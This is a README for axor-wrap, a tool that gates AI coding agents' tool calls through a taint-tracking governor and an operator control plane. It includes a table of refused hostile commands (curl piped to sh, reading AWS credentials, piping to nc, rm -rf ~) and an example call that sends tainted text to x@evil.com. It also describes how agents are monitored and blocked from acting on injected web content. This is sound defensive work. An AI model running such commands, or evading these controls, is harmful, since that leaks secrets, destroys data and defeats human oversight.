# axor-wrap

[![PyPI](https://img.shields.io/pypi/v/axor-wrap?cacheSeconds=300)](https://pypi.org/project/axor-wrap/)
[![Python](https://img.shields.io/pypi/pyversions/axor-wrap?cacheSeconds=300)](https://pypi.org/project/axor-wrap/)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)

**Wrap engine for the Axor ecosystem: point it at agent code, get tool manifests, governance config, and a kernel-gated runtime.**

Takes an agent codebase (plain Python / LangChain / MCP), statically finds its tools, and emits:

1. **tool-manifests** — `tool-manifest/v1` files, the runnable contract [axor-lab](https://github.com/Bucha11/axor-lab) benchmarks against;
2. **governance config** — a `GovernanceConfig`-loadable YAML and `ToolCallGovernor` kwargs, using the same manifest→config compilation semantics as axor-lab;
3. **a wrapped runtime** — every tool call goes `evaluate → deny? → call → register_output` through the real [axor-core](https://github.com/Bucha11/axor-core) kernel;
4. **a live governed node** — `axor_wrap.plane` speaks the Control-Plane protocol (v0.2), so the wrapped agent can attach to a plane and be paused/stopped by an operator.

The scanner and compiler are stdlib-only. axor-core is a required dependency — the wrapped runtime is the point of the package, and it needs the real kernel.

---

## Why one wrap serves both products

The Axor ecosystem has two consumers of the same wrapped runtime:

- **Control Plane** speaks the plane protocol: a node enrolls, receives its admitted config, and enforces per-call with `ToolCallGovernor` — the 9-gate, per-value taint engine.
- **Lab** speaks the runtime-jobs protocol (*Lab assigns, the runtime executes*): the runtime registers once, pulls experiment assignments, runs trials locally under the same governor, and pushes back kernel events + traces.

Both consume the same two artifacts this package produces: **tool manifests** (what the tools are, what they can affect) and the **compiled governor config** (which tools are egress sinks, which are untrusted sources, which arguments drive the gate). Wrap once — connect to either.

```
agent code ──scan──► DetectedTool ──infer──► EffectGuess ──build──► tool-manifest/v1
                                                                        │
                                              ┌─────────────────────────┤
                                              ▼                         ▼
                                     governor kwargs /          WrappedToolset
                                     governance YAML            (axor-core gate)
                                              │                         │
                                     Control Plane ◄── one runtime ──► Lab
```

### Where the plane lives, and why

The Control-Plane primitives are **here**, in `axor_wrap.plane`, not in axor-core:

| | lives in | what it is |
|---|---|---|
| `DesiredState`, `Injection`, `Excision`, `excision_refused_refs` | **axor-core** (`kernel.state`) | the lattice and provenance guard the kernel folds — enforcement reasons over these whether or not a plane exists |
| `canonicalize` (JCS/RFC 8785), `kernel.events`, `contracts.trace` | **axor-core** | the canonical bytes commands are signed over, and the schemas telemetry speaks |
| `AdmissionController` | **axor-core** (`contracts.admission`) | a pure contract, no imports — the seam `IntentLoop`/`GovernedSession` steer through |
| `PlaneSession`, `PlaneClient`, `PlaneAdmission`, `trace_to_kernel` | **axor-wrap** (`axor_wrap.plane`) | protocol-v0.2 session semantics, the outbound transport, the admission implementation, the trace→event projection |

The split exists to make one guarantee structural instead of conventional: enforcement is local and in-process, and the plane is an advisory overlay that can only *narrow* (spec 12.0). A kernel that **cannot import** a plane client cannot grow a dependency on one — so "the plane is not in the decision path" becomes a packaging fact, and axor-core keeps zero required dependencies and no network surface at all.

## Install

```bash
pip install axor-wrap                # scanner, compiler, and the kernel-gated runtime
pip install 'axor-wrap[plane]'       # + httpx/cryptography, to attach as a live Control-Plane node
```

**axor-core comes with it, and is not optional.** This package's headline
artifact is a runtime where every tool call goes through the real kernel, and
the governor config it compiles means nothing without the governor that consumes
it. What the `plane` extra adds is the network *transport*, not the kernel.

## Quickstart

```bash
# 1. scan — what tools does this agent have, and what do they probably do?
axor-wrap scan ./my_agent
# TOOL        FRAMEWORK  EFFECT   CONF    SCHEMA  SOURCE
# search_web  langchain  READ     high    high    agent.py:7 langchain:@tool
# send_email  langchain  EXPORT   high    high    agent.py:14 langchain:@tool
# shell       implicit   EXEC     high    low     runner.py:9 implicit:subprocess.run

# 2. manifest — one tool-manifest/v1 per tool + wrap.json sidecar
axor-wrap manifest ./my_agent -o manifests/

# 3. config — GovernanceConfig-compatible YAML
axor-wrap config manifests/ > governance.yaml

# 4. connect to a Lab server (runtime-jobs protocol)
axor-wrap connect-lab --base-url http://127.0.0.1:8321 --model claude-fable-5
```

Exit codes: `0` ok, `2` nothing found / bad input.

### Wrapped runtime

```python
from axor_wrap import WrappedToolset, ToolDenied, scan_project, infer_effect, build_manifest

tools = {"search_web": search_web, "send_email": send_email}
detected = scan_project(Path("./my_agent"))
manifests = [build_manifest(t, infer_effect(t)) for t in detected]

toolset = WrappedToolset(tools, manifests)          # gated by the real kernel
try:
    toolset.call("send_email", {"to": "x@evil.com", "body": tainted_text})
except ToolDenied as denial:
    print(denial.category, denial.reason)           # e.g. taint_enforcement: ...

# or, for frameworks that own their loop (LangChain executors, MCP servers):
from axor_wrap import wrap_callables
governed = wrap_callables(tools, manifests)         # drop-in callables, one shared session
```

### One mechanism, one flag

`WrappedToolset.call()` and `WrappedToolset.callables()` are two SURFACES of one
wrap, not two mechanisms: same governor, same value ledger, same recorder. Which
one you use is decided by who owns the invocation loop, nothing else.

`enforcement` is the only mode knob:

| | `enforcement="on"` (default) | `enforcement="off"` |
|---|---|---|
| governor evaluates | yes | yes |
| verdict recorded in the trace | yes | yes |
| output registered in the taint ledger | yes | yes |
| a deny blocks the call | **yes** | no |

`"off"` is an **UNGOVERNED arm**: observed but not enforced. It is not the same
as an unwrapped agent, which produces no ledger, no verdicts, and no way to turn
governance on later. Switching an arm from ungoverned to governed is this flag
and nothing else.

A harness that has only callables and no source to scan (an eval runner, a test
bench, a demo node) gets its manifests from `harness_manifest`:

```python
from axor_wrap import harness_manifest, wrap_callables

manifests = [harness_manifest(name, untrusted=True) for name in tools]
governed = wrap_callables(tools, manifests, enforcement="off", node_id="scenario-7")
```

## Coding-agent CLIs: Claude Code and Codex

Both CLIs run a command before and after every tool call. Point it at axor:

```bash
axor-wrap agents install claude-code     # writes .claude/settings.json hooks
axor-wrap agents install codex           # writes .codex/hooks.json; trust it with /hooks
axor-wrap connect https://cp.example --key ak_…   # optional, once per machine
```

`connect` checks the address and the key against the plane and saves them in
`~/.axor/connection.json` (this user only). Every axor command on the machine
reads it: the sidecar, `skill share` / `skill try`, `tree run`, axor-eval's
`--plane`. `AXOR_PLANE_URL` / `AXOR_INGEST_KEY` still override it for one run.
`axor-wrap connect` alone says where it reports; `axor-wrap disconnect` forgets.

Every hook goes to one sidecar per repository (started on first use, gone after
30 idle minutes). It holds the kernel's per-call governor for each agent
session and ONE taint ledger for every agent in the repository: a page Claude
Code fetched is tainted when Codex later carries its content into a shell
command, and the call is denied. Each session ships its trace — calls, results,
denials with the gate that denied them, and its final answer as the run's claim
— and obeys pause, stop and the call budget from the Control Plane.

`AXOR_ENFORCE=0` governs and records without denying (the agent is told what
would have been refused). An unreachable sidecar never means an ungoverned
call: the call is judged alone; `AXOR_FAIL_CLOSED=1` denies instead if even that
fails. An orchestrator running an agent as a node of a tree sets
`AXOR_NODE_ID` / `AXOR_PARENT_NODE` / `AXOR_TREE_RUN` / `AXOR_ROLE` in its
environment, and the node is named for it.

### Trees of agents

```yaml
# axor.tree.yaml
task: Add rate limiting to the auth module
nodes:
  plan:   {agent: claude-code, model: claude-fable-5-2, out: plan}
  read:   {agent: codex, model: luna, count: 5, access: read,
           shard: plan.questions, out: findings}
  impl:   {agent: claude-code, model: claude-opus-5-5, after: [read]}
```

```bash
axor-wrap tree check            # the stages it would run
axor-wrap tree run              # run it in this repository
```

The tree runs as one governed axor-core session: its root issues the kernel's
own `spawn_child` per stage (a parallel batch for `count`), each node is a
declared child role on its CLI (`claude -p` / `codex exec`), so every child is
gated like any spawn and the trace — and the Control Plane's topology — draws
the tree from the spawns. A `read` node is started read-only and the sidecar
refuses anything that is not a read. A `findings` node's answer is checked by
the kernel against the files that node actually opened before the next stage
sees it; the implementer is told which findings are verified. A node whose
hooks never reported (ungoverned, as far as anyone can tell) hands on an
untrusted answer, and the kernel will not let it drive the next spawn.

**Plan.** A tree of one agent family (Claude Code planning, writing and
reviewing) is free. Mixing families in one tree — Claude Code writing, Codex
reviewing — needs a paid workspace: `tree run` asks the connected plane
(`/v1/license/entitlements`) and refuses a mixed tree on the
free plan or with no plane to ask; `tree check` says so up front. Protection is
never gated: every session's hooks deny locally whatever the plan.

**Context flow.** A node is not handed everything its ancestors said. Each
answer is cut into items (the plan, each finding, each text answer) with a ref
(`read#2/f3`) and its provenance as the tree's ledger sees it. A node gets what
is relevant to its own part first — verified findings before unverified,
duplicates folded — within `context_tokens` (default 8000); the rest is listed
as one-line pointers it can pull through the `axor_context` MCP server
(`search`, `get`), which every node is started with. An item from a node that
read untrusted content is never pushed — not its text, not a plan's questions —
only listed by ref; pulling it is a tool call the sidecar records as an
untrusted read in the puller's session. An operator can cut an item, or a whole
answer, from the Control Plane before the next stage (`excision` on the tree's
node): it is gone from push and pull. The run's report says, per node, what was
pushed, pointed to, withheld and cut.

### What is refused whoever asked

The governor refuses what OUTSIDE text drives — a command built from a page
WebFetch read. That leaves the agent's own instructions: a skill, a CLAUDE.md,
the task itself. So every call is also checked against a short list of things a
coding task almost never needs and an attacker almost always does — refused in
every session, whatever asked for it (`axor_wrap/agents/rules.py`):

| rule | refused | passes |
|---|---|---|
| `download_and_run` | `curl … \| sh`, `bash <(curl …)` | `curl -s https://api…` |
| `secrets` | `cat ~/.aws/credentials`, Read `.env`, `echo $API_KEY`, `printenv` | `cp .env.example .env`, `$TOKEN` in a header |
| `sends_out` | `curl -d @file`, `-F x=@file`, `\| nc host`, `scp f host:` | `curl -X POST -d '{…}' localhost` |
| `persistence` | `~/.bashrc`, `.git/hooks/`, `crontab file`, `systemctl enable` | `crontab -l` |
| `writes_outside` | Write `/etc/…`, `~/…` outside the repository | the repository, `/tmp` |
| `destructive` | `rm -rf ~`, `rm -rf` outside the repository, `git push --force`, `mkfs` | `rm -rf node_modules`, `--force-with-lease` |
| `privilege` | `sudo`, `su`, `doas` | |
| `agent_config` | editing `.claude/settings*.json`, `.codex/hooks.json`, `.axor/rules.json` | |

A repository that needs one turns it off by id in `.axor/rules.json`
(`{"allow": ["force_push"]}`) or `AXOR_ALLOW_RULES`; `agent_config` cannot be
turned off from inside the workspace. A refusal tells the agent which rule and
how to allow it, and ships to the plane with gate `consequence`.

### Skills turned off for the team

A skill can be turned off for every developer from the Control Plane (Skill
evals → a skill's card → "turn off for the team"), or for one repository in
`.axor/rules.json` (`{"skills_off": ["test-first"]}`). Each sidecar asks the
plane for the list every 30 s (`AXOR_POLICY_TTL`) on the developer's ingest key,
keeps the last answer through an outage, and refuses the agent's use of a
turned-off skill: the `Skill` call naming it, and any read, edit or command
touching `.claude/skills/<name>/` or `.codex/skills/<name>/`. The refusal names
the skill and ships to the plane, which counts the attempts. What this cannot
do: the agent loads each installed skill's name and description at start, so
those stay in its context until the folder is removed — the plane does not
touch anyone's disk. (`.axor/rules.json` itself is the agent's own guard: it
cannot edit it.)

### Skills shared with the team

The other way round: a skill that works for one developer, installed for all
of them. `axor-wrap skill share ./.claude/skills/<name>` uploads the folder
to the connected plane; it reaches nobody until
someone turns it on for the team on the Control Plane (Skill evals → shared
with the team). Then each sidecar — at session start (Claude Code's
`SessionStart` hook) and with every policy refresh — installs it into the
agent's skills folder (`~/.claude/skills/<name>`, `~/.codex/skills/<name>`) at
the version turned on. A new upload reaches nobody until it is turned on
again; taken off the team, or turned off for it, the copies are removed.

Only folders the sidecar wrote are touched — each carries `.axor-team.json`.
A developer's own skill of the same name is never overwritten.
`AXOR_TEAM_SKILLS=0` opts a machine out. A shared skill is governed like any
other: the rules above still apply to what it asks the agent to do.

### The team's memory

What the team's agents verifiably learned in a repository — how to run its
tests, which command fails there and which works, notes people wrote — is
given to every agent at the start of its next session there: Claude Code on
`SessionStart`, Codex with its first prompt, as `additionalContext`, once per
session. The sidecar names the repository in the session's profile (a hash of
the normalized `origin` remote, so every clone is one repository; the label is
`owner/name`) and ships, with each call, the outside sources its arguments
carry (`carries`: web, mcp, …) — the Control Plane learns only from check
commands that passed, and never one something outside wrote.
`AXOR_TEAM_MEMORY=0` keeps it out of one machine's agents.

### Pair sessions: notes from people watching

A developer can start a pair on their session in the Control Plane (Agents →
pair sessions) and send the link: teammates — and, on a paid plan, people from
outside the team — watch the session's steps live and can write the agent a
note. The sidecar asks the plane for notes at most every 3 s
(`AXOR_NOTES_TTL`) and gives them to the agent beside the next tool result
(`PostToolUse` / `PostToolUseFailure`) or with the next prompt
(`UserPromptSubmit`), as `additionalContext`, then tells the plane where — the
pair sees the note land. A teammate's note is taken as the developer's own
words. A note from outside the team is outside text: anything the agent builds
from it meets the same rules as what came from a web page (a command driven by
it is refused).

### Skills, before you install one

A skill (a folder with `SKILL.md`, often scripts beside it) is read by the
agent as its own instructions. The rules above still hold for it; what they do
not cover runs, and a script the skill ships is one call (`bash scripts/x.sh`)
— what it does inside is not seen. Two ways to look first:

```bash
axor-wrap skill check ./release-helper   # what it asks the agent to do — nothing is run
axor-wrap skill try ./release-helper     # an agent uses it once, on a copy, Axor enforcing
axor-wrap skill try ./release-helper --agent codex --task "cut release 1.4"
```

`check` reads the folder and lists, with file and line: downloads that are run,
secrets read, data sent out, writes outside the repository, destructive
commands, root, persistence, packages installed, shell fetches (what `curl`
brings back is not marked — only WebFetch / WebSearch results are), pages it
tells the agent to follow, and tools its frontmatter pre-approves — each with
what Axor does about it: refused (by which rule), let run, or "inside a script".
`try` copies the repository to a temporary folder (no `.git`, `node_modules`,
virtualenvs), installs the skill where the agent looks (`.claude/skills/<name>`,
`.codex/skills/<name>`), and runs the agent once under the axor hooks, enforcing
as in real work — a dry run is not how a skill's `curl | sh` gets to run. On a
connected machine the session shows on the Control Plane as
`skill-try.<agent>.<skill>.<id>`, its refusals with their rule. The copy is
deleted unless `--keep`. (With `AXOR_ENFORCE=off` a session records instead of
refusing: each call that would have been refused ships with `would_deny`.)

## What the scanner detects

| Pattern | Framework tag |
|---|---|
| `@tool` (any alias from `langchain_core.tools` / `langchain.tools`) | `langchain` |
| `StructuredTool.from_function(...)` | `langchain` |
| `Tool(name=..., func=...)` | `langchain` |
| `@mcp.tool()` / `@server.tool()` (incl. `x = FastMCP(...)` bindings) | `mcp` |
| dict literals with `{name, description, input_schema}` | `anthropic` |
| `subprocess.run/Popen/...`, `os.system` → implicit `shell` candidate | `implicit` |

Argument schemas are inferred from type hints (`str→string`, `int→integer`, `float→number`, `bool→boolean`; default present → optional). **Honesty rule:** anything not inferable stays a bare `{"type": "object"}` with `schema_confidence: "low"` — the scanner never invents types.

## Manifest format

The embedded schema `axor_wrap/schemas/tool-manifest.schema.json` is a verbatim copy of **`axor-lab/contracts/schemas/tool-manifest.schema.json` — the axor-lab contracts are the source of truth**; this copy only removes the cross-repo import. `validate_manifest` checks against it with a minimal own subset validator (same approach as axor-lab's `lab_contracts/subset_validator.py`; no `jsonschema` dependency).

Compilation semantics match axor-lab's `compiled_governor_config`: effect class EXPORT/EXEC (default or any `resolve` rule) → `egress_sinks`; declared `untrusted_fields` → `untrusted_sources`; `effect.driving_args` → `driving_args`; a policy allowlist → an enum `value_policy` on each sink's first driving arg.

## Status: what's real / not yet

**Real today**

- static detection of the 6 patterns above, with signature→schema inference;
- valid `tool-manifest/v1` output + embedded-schema validation;
- governor-config compilation with axor-lab's exact mapping semantics;
- `WrappedToolset` / `wrap_callables` driving the real `ToolCallGovernor` (extra `kernel`), on either surface, under either enforcement setting;
- `harness_manifest` — a valid `tool-manifest/v1` from asserted roles, for a caller that has the callables but no source to scan;
- `LabRuntimeConnector` — the full runtime-jobs handshake (connect / poll / claim / events / complete), tested against a protocol stub.
- `PlaneConnector` — a **live governed node on the Control Plane** (extra `plane`), built on this package's own `axor_wrap.plane` primitives (`PlaneSession`/`PlaneClient`): it registers, heartbeats (Control's topology shows the node with a level that mirrors its posture — `NORMAL` / `CAUTIOUS` / `RESTRICTED`), and subscribes to desired state over SSE, so an operator's **pause / stop / budget-cap** is applied to the node by real plane code. `PlaneConnector.gate(toolset)` binds that posture to a wrapped runtime, so a pause/stop actually **holds real tool execution** (`AdmissionHeld`), not just a session flag. Tested against a stdlib SSE plane-backend stub that pushes a real `{paused: true}` delta.
- `PlaneConnector.post_health_check(payload)` — the out-dial half of the behavioral health check. A node that runs an [axor-probe](https://github.com/Bucha11/axor-probe) battery posts the finished verdict to the plane, which renders it on its Health panel. The payload is `axor_probe.integration.plane.health_payload(report)`; the dict is the whole contract, so axor-wrap never imports axor-probe and a node that does not probe simply never calls this. Batteries are the node's to run: the plane has no inbound path into a runtime, and a health check is not an exception.

```python
from axor_wrap import PlaneConnector, WrappedToolset

toolset = WrappedToolset(tools, manifests)                 # gated by the real kernel
node = PlaneConnector("https://plane.example", "node-1",   # axor-wrap[plane]
                      operator_keys={"ops": "<ed25519-hex>"})
node.connect()
node.gate(toolset)             # paused/stopped node → toolset.call raises AdmissionHeld
await node.run(ttl=180)        # heartbeat + desired-state loop until stop()/ttl

# and, if this node also probes itself for behavioral drift:
from axor_probe.integration.plane import health_payload   # axor-probe, optional
report = await pipeline.run(event)
if report is not None:
    await node.post_health_check(health_payload(report))
```

**Not yet / honest limits**

- **Full IntentLoop-admission on live load**: `PlaneConnector` connects and gates tool calls at the intent boundary, but the deeper axor-core path — an operator injection / excision / replan winding a running `IntentLoop` down via `GovernedSession(executor=Invokable, admission=PlaneAdmission(session))` — needs the framework to hand axor-core an `Invokable` agent brain. The wrap model gates tools while the framework owns the invocation loop, so it exposes the posture gate (`admit`) rather than owning an `IntentLoop`. Adopting the full path is a per-framework integration, not a change to this connector.
- **Role inference is a heuristic** with `UNKNOWN` as a first-class outcome; final classification is a human decision in the config builder. In the manifest an `UNKNOWN` compiles **fail-closed to `EXEC`** (the tool lands in `egress_sinks` until reviewed); the raw guess + confidence + reason survive in `wrap.json`.
- The detector covers the 6 patterns listed — dynamically registered tools (loops building `Tool(...)` from data, decorators re-exported through helper modules, tools defined in non-Python config) are out of static reach and will not be found.
- `effect.resolve` rules, `result_schema`, `sensitive_fields`, simulation/reset strategies are not auto-generated — the manifest is a reviewed starting point, not a finished contract.

## Development

```bash
uv run --extra dev --extra plane pytest -q   # the whole suite
python -m unittest discover -s tests -t .    # the stdlib-only half, no axor-core needed
ruff check .
```

`axor_wrap.plane`'s tests came over from axor-core verbatim (they pin protocol-v0.2
governance invariants, so they were moved rather than rewritten) and are pytest-native;
everything else is stdlib `unittest`, which pytest collects too.

License: Apache-2.0.
